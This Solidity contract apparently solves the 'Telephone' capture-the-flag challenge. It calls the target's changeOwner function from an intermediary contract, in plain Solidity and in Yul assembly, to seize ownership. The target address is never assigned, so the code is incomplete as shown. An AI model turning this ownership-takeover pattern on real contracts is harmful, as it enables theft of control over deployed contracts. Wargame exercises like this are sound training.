// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Telephone {
    function changeOwner(address) external;
}

contract TelephoneHack {
    Telephone telephone;

    function solidityVersion() public {
        telephone.changeOwner(msg.sender);
    }

    function yulVersion() public {
        assembly{
            mstore(0, "changeOwner(address)")
            mstore(0, keccak256(0, 20))
            mstore(4, caller())

            let success := call(gas(), sload(telephone.slot), 0, 0, 0x24, 0,0)
            if iszero(success){
                revert(0,0)
            }
        }
    }
}
